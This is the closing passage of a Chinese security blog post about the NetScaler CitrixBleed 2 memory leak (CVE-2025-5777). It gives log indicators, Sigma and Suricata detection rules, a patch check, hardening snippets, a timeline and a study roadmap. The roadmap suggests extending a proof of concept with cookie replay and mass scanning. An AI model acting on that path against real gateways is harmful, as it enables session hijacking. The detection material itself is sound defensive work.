+<h3 id="0x06-蓝队视角：检测、取证与补丁验证"><a href="#0x06-蓝队视角：检测、取证与补丁验证" class="headerlink" title="0x06  蓝队视角：检测、取证与补丁验证"></a>0x06  蓝队视角：检测、取证与补丁验证</h3><h4 id="6-1-日志与-IoC"><a href="#6-1-日志与-IoC" class="headerlink" title="6.1  日志与 IoC"></a>6.1  日志与 IoC</h4><table>
+<thead>
+<tr>
+<th>来源</th>
+<th>表现</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>&#x2F;var&#x2F;log&#x2F;ns.log</strong></td>
+<td><code>AAA_TRANSACTION &lt;client_ip&gt; - Host header length: 6144</code></td>
+</tr>
+<tr>
+<td><strong>HTTP_ACCESS.log</strong></td>
+<td><code>/nf/auth/startwebview.do</code> 请求耗时极短但响应大小异常（&gt; 2 KB）</td>
+</tr>
+<tr>
+<td><strong>EDR&#x2F;PCAP</strong></td>
+<td><code>Set-Cookie: NSC_USER=</code> 出现在非登录请求的响应中</td>
+</tr>
+</tbody></table>
+<h4 id="6-2-Sigma-规则（简要版）"><a href="#6-2-Sigma-规则（简要版）" class="headerlink" title="6.2  Sigma 规则（简要版）"></a>6.2  Sigma 规则（简要版）</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">title:</span> <span class="hljs-string">CitrixBleed2</span> <span class="hljs-string">Host</span> <span class="hljs-string">Header</span> <span class="hljs-string">OOB</span> <span class="hljs-string">Leak</span><br><span class="hljs-attr">status:</span> <span class="hljs-string">experimental</span><br><span class="hljs-attr">logsource:</span><br>  <span class="hljs-attr">category:</span> <span class="hljs-string">webserver</span><br>  <span class="hljs-attr">product:</span> <span class="hljs-string">netscaler</span><br><span class="hljs-attr">detection:</span><br>  <span class="hljs-attr">selection:</span><br>    <span class="hljs-attr">cs-uri-stem:</span> <span class="hljs-string">&quot;/nf/auth/startwebview.do&quot;</span><br>    <span class="hljs-string">cs-bytes|gt:</span> <span class="hljs-number">2048</span><br>    <span class="hljs-string">c-host|strlen|gt:</span> <span class="hljs-number">4096</span><br>  <span class="hljs-attr">condition:</span> <span class="hljs-string">selection</span><br><span class="hljs-attr">level:</span> <span class="hljs-string">critical</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="6-3-补丁验证脚本"><a href="#6-3-补丁验证脚本" class="headerlink" title="6.3  补丁验证脚本"></a>6.3  补丁验证脚本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nscli -s 127.0.0.1:3008 \<br>      -c <span class="hljs-string">&quot;show ns version&quot;</span> | grep -E <span class="hljs-string">&quot;13\.1-58\.32|14\.1-43\.56&quot;</span> \<br>      &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Patched ✅&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Vulnerable ❌&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="6-4-Kill-会话"><a href="#6-4-Kill-会话" class="headerlink" title="6.4  Kill 会话"></a>6.4  Kill 会话</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## 清除全部活动 VPN/ICA 连接</span><br><span class="hljs-built_in">kill</span> icaconnection -all<br><span class="hljs-built_in">kill</span> vpn -all<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>注意</strong>：补丁后仍需强制注销，防止攻击者继续使用已窃取 Cookie。</p>
+</blockquote>
+<hr>
+<h3 id="0x07-防御加固"><a href="#0x07-防御加固" class="headerlink" title="0x07  防御加固"></a>0x07  防御加固</h3><ol>
+<li><strong>官方补丁</strong>：升至 ≥ 14.1-43.56 &#x2F; 13.1-58.32，或对 FIPS&#x2F;NDcPP 机型套用对应版本 (<a target="_blank" rel="noopener" href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)。</li>
+<li><strong>Host Header 长度限制</strong>（临时措施）</li>
+</ol>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">map</span> <span class="hljs-variable">$http_host</span> <span class="hljs-variable">$block_long_host</span> &#123;<br>    <span class="hljs-attribute">default</span>          <span class="hljs-number">0</span>;<br>    &quot;~^.&#123;4097,&#125;$&quot;    1;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br>    ...<br>    <span class="hljs-attribute">if</span> (<span class="hljs-variable">$block_long_host</span>) &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">413</span>; &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>WAF 自适应规则</strong>：对 <code>/nf/auth/</code> &amp; <code>/oauth/</code> 路径启用速率限制 (e.g. 20 req&#x2F;m)。</li>
+<li><strong>资产清点</strong>：EOL 版本 12.1&#x2F;13.0 永远不再收到官方补丁，计划替换或强隔离 (<a target="_blank" rel="noopener" href="https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420&utm_source=chatgpt.com" title="CVE-2025-5777 - CITRIX | Support">support.citrix.com</a>)。</li>
+<li><strong>MFA 安全</strong>：会话泄露绕过 MFA → 建议开启“每请求签名”或“动态绑定硬件指纹”，而非仅首登时验证。</li>
+</ol>
+<hr>
+<h3 id="0x08-学习-复习路线"><a href="#0x08-学习-复习路线" class="headerlink" title="0x08  学习 &#x2F; 复习路线"></a>0x08  学习 &#x2F; 复习路线</h3><table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>建议资料 &amp; 操作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>理论</strong></td>
+<td>阅读 Citrix 安全公告、Arctic Wolf &#x2F; Tenable FAQ、Bishop Fox 技术拆解 (<a target="_blank" rel="noopener" href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>, <a target="_blank" rel="noopener" href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>, <a target="_blank" rel="noopener" href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)</td>
+</tr>
+<tr>
+<td><strong>实验</strong></td>
+<td>部署 vuln 版 13.1-55.18（ESXi &#x2F; KVM），跑最小 PoC，Wireshark 抓包 → 观察 <code>TCP PSH</code> 回包</td>
+</tr>
+<tr>
+<td><strong>编码</strong></td>
+<td>改写 PoC：加入自动 Cookie 重播、ZTLS 批量扫描、多线程队列</td>
+</tr>
+<tr>
+<td><strong>蓝队</strong></td>
+<td>以两小时为窗口搜索异常 Host 长度；用 Sigma-→Elastic&#x2F;Graylog；复现并验证 WAF 策略</td>
+</tr>
+<tr>
+<td><strong>分享</strong></td>
+<td>编写博客或制作思维导图，总结“同类 snprintf 使用陷阱”</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="附录-A-—-检测-防御片段"><a href="#附录-A-—-检测-防御片段" class="headerlink" title="附录 A — 检测 &#x2F; 防御片段"></a>附录 A — 检测 &#x2F; 防御片段</h3><details><summary>📜 Sigma 规则完整版</summary>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">title:</span> <span class="hljs-string">Netscaler</span> <span class="hljs-string">CitrixBleed2</span> <span class="hljs-string">Large</span> <span class="hljs-string">Host</span> <span class="hljs-string">Header</span><br><span class="hljs-attr">id:</span> <span class="hljs-string">4d6f1e1b-0bfe-4473-a732-3e7e9a21f650</span><br><span class="hljs-attr">status:</span> <span class="hljs-string">experimental</span><br><span class="hljs-attr">description:</span> <span class="hljs-string">Detects</span> <span class="hljs-string">abnormal</span> <span class="hljs-string">Host</span> <span class="hljs-string">header</span> <span class="hljs-string">length</span> <span class="hljs-string">in</span> <span class="hljs-string">requests</span> <span class="hljs-string">to</span> <span class="hljs-string">/nf/auth/startwebview.do</span><br><span class="hljs-attr">references:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">https://nvd.nist.gov/vuln/detail/CVE-2025-5777</span><br><span class="hljs-attr">author:</span> <span class="hljs-string">mingshenhk</span><br><span class="hljs-attr">logsource:</span><br>  <span class="hljs-attr">product:</span> <span class="hljs-string">netscaler</span><br>  <span class="hljs-attr">service:</span> <span class="hljs-string">http_access</span><br><span class="hljs-attr">detection:</span><br>  <span class="hljs-attr">selection:</span><br>    <span class="hljs-attr">cs-uri-stem:</span> <span class="hljs-string">&quot;/nf/auth/startwebview.do&quot;</span><br>    <span class="hljs-string">c-host|strlen|gt:</span> <span class="hljs-number">4096</span><br>  <span class="hljs-attr">condition:</span> <span class="hljs-string">selection</span><br><span class="hljs-attr">level:</span> <span class="hljs-string">critical</span><br></code></pre></td></tr></table></figure>
+
+</details>
+
+<details><summary>🛡️ Suricata 规则</summary>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs suricata">alert http any any -&gt; any any (<br>  msg:&quot;CitrixBleed2 CVE-2025-5777 Host header overflow&quot;;<br>  http.uri; content:&quot;/nf/auth/startwebview.do&quot;; nocase;<br>  http.header; field:Host; content:&quot;AAAAAAAA&quot;; within:0; distance:0; offset:4096;<br>  classtype:attempted-recon;<br>  sid:5777002; rev:1;<br>)<br></code></pre></td></tr></table></figure>
+
+</details>
+
+<details><summary>🔒 Nginx-Lua Inline Hotpatch</summary>
+
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-comment">-- access_by_lua_block</span><br><span class="hljs-keyword">local</span> host = ngx.var.http_host <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> #host &gt; <span class="hljs-number">4096</span> <span class="hljs-keyword">then</span><br>  ngx.<span class="hljs-built_in">log</span>(ngx.WARN,<span class="hljs-string">&quot;[CitrixBleed2] Blocked Host len=&quot;</span>,#host)<br>  <span class="hljs-keyword">return</span> ngx.<span class="hljs-built_in">exit</span>(ngx.HTTP_REQUEST_HEADER_FIELDS_TOO_LARGE)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+</details>
+
+<hr>
+<h3 id="附录-B-—-时间轴"><a href="#附录-B-—-时间轴" class="headerlink" title="附录 B — 时间轴"></a>附录 B — 时间轴</h3><table>
+<thead>
+<tr>
+<th>日期 (2025)</th>
+<th>事件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>06-17</td>
+<td>Citrix 初次发布 CVE-2025-5777 公告 (<a target="_blank" rel="noopener" href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</td>
+</tr>
+<tr>
+<td>06-18</td>
+<td>Bishop Fox 首发技术拆解 &amp; PoC (<a target="_blank" rel="noopener" href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)</td>
+</tr>
+<tr>
+<td>06-23</td>
+<td>Citrix 更新影响范围 + 补丁版本；CISA 将其列入 KEV</td>
+</tr>
+<tr>
+<td>06-25</td>
+<td>ReliaQuest 报告活跃利用，威胁组正批量窃取会话 (<a target="_blank" rel="noopener" href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>)</td>
+</tr>
+<tr>
+<td>06-27</td>
+<td>BleepingComputer 报道“可能已大规模被利用” (<a target="_blank" rel="noopener" href="https://www.bleepingcomputer.com/news/security/citrix-bleed-2-flaw-now-believed-to-be-exploited-in-attacks/?utm_source=chatgpt.com" title="Citrix Bleed 2 flaw now believed to be exploited in attacks">bleepingcomputer.com</a>)</td>
+</tr>
+<tr>
+<td>06-28</td>
+<td>多个 GitHub PoC 出现；Tenable 发布 FAQ (<a target="_blank" rel="noopener" href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>)</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ol>
+<li>Citrix 官方安全通告与补丁说明 (<a target="_blank" rel="noopener" href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</li>
+<li>Arctic Wolf《CVE-2025-5777 技术简报》 (<a target="_blank" rel="noopener" href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>)</li>
+<li>Bishop Fox《OOB Memory Read in NetScaler》 (<a target="_blank" rel="noopener" href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)</li>
+<li>ReliaQuest《Threat Spotlight: CitrixBleed 2》 (<a target="_blank" rel="noopener" href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>)</li>
+<li>Tenable FAQ on CVE-2025-5777 (<a target="_blank" rel="noopener" href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>)</li>
+<li>BleepingComputer 安全快讯 (<a target="_blank" rel="noopener" href="https://www.bleepingcomputer.com/news/security/citrix-bleed-2-flaw-now-believed-to-be-exploited-in-attacks/?utm_source=chatgpt.com" title="Citrix Bleed 2 flaw now believed to be exploited in attacks">bleepingcomputer.com</a>)</li>
+<li>NVD CVE-2025-5777 条目 (<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-5777?utm_source=chatgpt.com" title="CVE-2025-5777 Detail - NVD">nvd.nist.gov</a>)</li>
+<li>Citrix Support KB CTX693420 (<a target="_blank" rel="noopener" href="https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420&utm_source=chatgpt.com" title="CVE-2025-5777 - CITRIX | Support">support.citrix.com</a>)</li>
+</ol>
+<blockquote>
+<p><strong>完</strong> — 希望本文档能帮助你全方位理解并应对 CitrixBleed 2。如果需要进一步补充示例、脚本或演练指导，欢迎继续提出！</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Github-Poc/" class="category-chain-item">Github Poc</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="print-no-link">#信息泄露</a>
+      
+        <a href="/tags/CVE-2025-github-search/" class="print-no-link">#CVE-2025:github search</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Citrix NetScaler ADC/Gateway 越界内存读取漏洞</div>
+      <div>http://example.com/2025/06/30/github_1889405732/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>lianccc</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/06/30/github_2926243623/" title="Github Poc">
+                        <span class="hidden-mobile">Github Poc</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
